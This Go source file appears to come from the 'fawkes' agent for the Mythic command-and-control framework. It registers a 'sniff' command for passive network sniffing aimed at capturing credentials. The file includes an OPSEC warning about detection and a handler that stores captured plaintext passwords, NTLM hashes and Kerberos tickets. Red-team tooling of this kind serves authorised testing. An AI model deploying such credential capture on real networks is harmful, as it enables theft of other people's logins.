package agentfunctions

import (
	"encoding/json"
	"fmt"
	"path/filepath"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "sniff",
		Description:         "sniff [-interface eth0] [-duration 30] [-ports 21,80,445] [-promiscuous true] - Passive network sniffing for credential capture.",
		HelpString:          "sniff [-interface eth0] [-duration 30] [-ports 21,80,445] [-promiscuous true] [-max_bytes 52428800]",
		Version:             1,
		MitreAttackMappings: []string{"T1040"}, // Network Sniffing
		Author:              "@galoryber",
		ScriptOnlyCommand:   false,
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "sniff_new.js"),
			Author:     "@galoryber",
		},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS, agentstructs.SUPPORTED_OS_WINDOWS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:          "interface",
				CLIName:       "interface",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:   "Network interface to sniff (e.g. eth0, ens33). Empty = all interfaces.",
				DefaultValue:  "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     1,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "duration",
				CLIName:       "duration",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:   "Capture duration in seconds (default: 30, max: 300)",
				DefaultValue:  30,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     2,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "ports",
				CLIName:       "ports",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:   "Comma-separated TCP/UDP ports to filter (default: 21,53,80,88,110,143,389,445,8080). Includes DNS (53) and Kerberos (88).",
				DefaultValue:  "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     3,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "promiscuous",
				CLIName:       "promiscuous",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				Description:   "Enable promiscuous mode to capture traffic not destined for this host",
				DefaultValue:  false,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     4,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "max_bytes",
				CLIName:       "max_bytes",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:   "Stop after capturing this many bytes (default: 52428800 = 50MB)",
				DefaultValue:  52428800,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     5,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "save_pcap",
				CLIName:       "save_pcap",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				Description:   "Save raw packet capture as PCAP file (downloadable via Mythic file browser)",
				DefaultValue:  false,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     6,
						GroupName:            "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input != "" {
				return args.LoadArgsFromJSONString(input)
			}
			return nil
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:          taskData.Task.ID,
				Success:         true,
				OpsecPreBlocked: false,
				OpsecPreMessage: "OPSEC WARNING: Network sniffing (T1040) opens a raw socket which requires root/CAP_NET_RAW (Linux/macOS) or Administrator (Windows). " +
					"Windows uses SIO_RCVALL which may be flagged by security products. " +
					"Promiscuous mode changes the NIC state and may be detected by network monitoring tools (promiscdetect, antisniff). " +
					"Raw socket creation may trigger host-based IDS alerts. " +
					"Captured traffic stays in memory — no PCAP written to disk.",
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(task *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  task.Task.ID,
			}
			if displayParams, err := task.Args.GetFinalArgs(); err == nil && displayParams != "" {
				response.DisplayParams = &displayParams
			}
			createArtifact(task.Task.ID, "Raw Socket", "AF_PACKET raw socket for network sniffing")
			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{TaskID: processResponse.TaskData.Task.ID, Success: true}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}

			// Parse the sniff result JSON to extract credentials
			var result struct {
				Credentials []struct {
					Protocol string `json:"protocol"`
					SrcIP    string `json:"src_ip"`
					DstIP    string `json:"dst_ip"`
					DstPort  uint16 `json:"dst_port"`
					Username string `json:"username"`
					Password string `json:"password,omitempty"`
					Detail   string `json:"detail,omitempty"`
				} `json:"credentials"`
			}
			if err := json.Unmarshal([]byte(responseText), &result); err != nil {
				return response
			}

			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
			for _, c := range result.Credentials {
				credType := "plaintext"
				credential := c.Password
				if c.Protocol == "ntlm" {
					credType = "hash"
					credential = c.Detail
				} else if c.Protocol == "krb-asrep" || c.Protocol == "krb-tgsrep" {
					credType = "ticket"
					credential = c.Detail
				}
				if credential == "" && c.Protocol != "ntlm" && c.Protocol != "krb-asrep" && c.Protocol != "krb-tgsrep" {
					continue
				}
				realm := c.DstIP
				if c.DstPort != 0 {
					realm = fmt.Sprintf("%s:%d", c.DstIP, c.DstPort)
				}
				creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
					CredentialType: credType,
					Realm:          realm,
					Account:        c.Username,
					Credential:     credential,
					Comment:        fmt.Sprintf("sniff: %s capture from %s", c.Protocol, c.SrcIP),
				})
			}
			registerCredentials(processResponse.TaskData.Task.ID, creds)
			return response
		},
	})
}
